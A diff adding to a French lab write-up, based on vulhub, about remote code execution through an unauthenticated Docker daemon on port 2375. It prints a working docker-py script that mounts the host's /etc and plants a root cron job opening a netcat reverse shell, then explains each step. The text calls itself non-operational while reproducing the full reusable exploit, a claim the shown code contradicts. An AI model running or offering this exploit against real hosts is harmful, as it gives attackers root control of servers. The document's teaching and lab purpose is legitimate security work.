@@ -233,6 +233,17 @@ Dans le cadre du labo, le but est de montrer qu’un attaquant peut :
 
 Ce comportement démontre comment un simple service mal configuré peut mener à une **exécution de code à distance**.
 
+
+
+Pour la démonstration, **deux machines sont utilisées : attaquante et victime (machine hote).** Chacune prend des actions précises.
+
+| Action                                     | Où ça se fait ?    |
+| ------------------------------------------ | ------------------ |
+| Docker daemon exposé sur 2375              | Machine victime    |
+| Script Python exploitant l’API             | Machine attaquante |
+| Connexion au reverse shell                 | Machine attaquante |
+| **Effet** : conteneur modifie /etc du host | Machine victime    |
+
 ------
 
 ## **3. Approche de l’attaquant dans l’exercice**
@@ -249,7 +260,128 @@ Tout cela est rendu possible car **le daemon n’impose aucune barrière de séc
 
 ------
 
-## **4. Exemple conceptuel du flux d’exploitation**
+## **4. Réproduction de la vulnérabilité (https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)**
+
+**Prérequis** : docker-py
+
+```bash
+pip install --upgrade pip && pip install docker
+```
+
+**Objectif de l'attaquand** : créer un conteneur qui va monter le repertoire /etc de la victime. 
+
+**Ce que l'attaquant gagne en faisant ça** : devient capable de modifier des systèmes de fichiers critiques. 
+
+**Comment l'attaquant peut faire ça**: ajouter une entrée malveillante dans la crontab qui crée un reverse shell. 
+
+**Avec quoi elle peut le faire**: avec un script python, par exemple 
+
+```python
+import docker
+
+IP = IP_CIBLE
+
+client = docker.DockerClient(base_url='http://{IP}:2375/')
+
+data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc {IP} 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
+```
+
+### **Que fait ce script exactement ?**
+
+Ce script Python utilise la bibliothèque **docker-py** pour envoyer des commandes au **Docker Remote API** exposé sur le port **2375**.
+
+Voici le déroulé, étape par étape, en **version compréhensible et non-opérationnelle** :
+
+------
+
+#### **1. Connexion à un Docker Daemon exposé**
+
+```python
+client = docker.DockerClient(base_url='http://your-ip:2375/')
+```
+
+→ Le script contacte un daemon Docker qui écoute en clair sur **TCP 2375**, sans authentification.
+ C’est précisément **la vulnérabilité**.
+
+------
+
+## **2. Lancement d’un conteneur Alpine**
+
+```python
+client.containers.run('alpine:latest', ...)
+```
+
+→ Le script démarre un conteneur basé sur l’image **Alpine Linux**.
+
+------
+
+## **3. Montage du répertoire /etc du système hôte**
+
+```python
+volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}
+```
+
+→ Le conteneur a accès en lecture/écriture au **/etc du système hôte**, ce qui **ne devrait jamais être possible**.
+
+C’est ce qui rend l’exploitation si grave : le conteneur peut modifier des fichiers critiques du système hôte.
+
+------
+
+## **4. Injection d’une ligne dans la crontab du système hôte**
+
+```python
+"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root"
+```
+
+→ Le script ajoute **une entrée de cron** dans la crontab du root du système hôte.
+Cette ligne ordonne au système d’exécuter régulièrement une commande destinée à ouvrir une connexion sortante (reverse shell) vers l’attaquant.
+
+Tu n’as pas besoin d’exécuter cette commande dans ton rapport — comprend seulement l’intention :
+
+**C’est une preuve que l’attaquant peut modifier les fichiers système hôte en exploitant Docker exposé.**
+
+------
+
+## **5. Le conteneur s’auto-supprime**
+
+```python
+remove=True
+```
+
+→ Une fois le travail accompli (l’injection), le conteneur disparaît.
+ L’attaque laisse donc très peu de traces.
+
+------
+
+# **En résumé**
+
+**1. Docker exposé sur 2375 = accès total au Docker API**
+ **2. Avec cet accès, un attaquant peut lancer un conteneur arbitraire**
+ **3. Ce conteneur peut monter /etc de l’hôte**
+ **4. Et modifier des fichiers critiques du système hôte (comme crontab)**
+ **5. Ce qui permet d’exécuter du code sur la machine hôte**
+
+C’est une **compromission totale**.
+
+```mermaid
+flowchart TD
+    A[Attaquant avec script Python] --> B[Connexion au port 2375 expose]
+    B --> C[Lancement d un conteneur Alpine]
+    C --> D[Montage du repertoire /etc du systeme hote]
+    D --> E[Modification de fichiers sensibles]
+    E --> F[Execution automatique par le systeme]
+    F --> G[Compromission du systeme hote]
+```
+
+
+
+#### **Comment vérifier le succès de l'exploitation ?**
+
+En recevant la connexion de reverse shell :
+
+[![Reverse Shell Exploitation](https://github.com/vulhub/vulhub/raw/master/docker/unauthorized-rce/1.png)](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/1.png)
+
+This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
 
 Voici la logique — pas les commandes réutilisables :
 
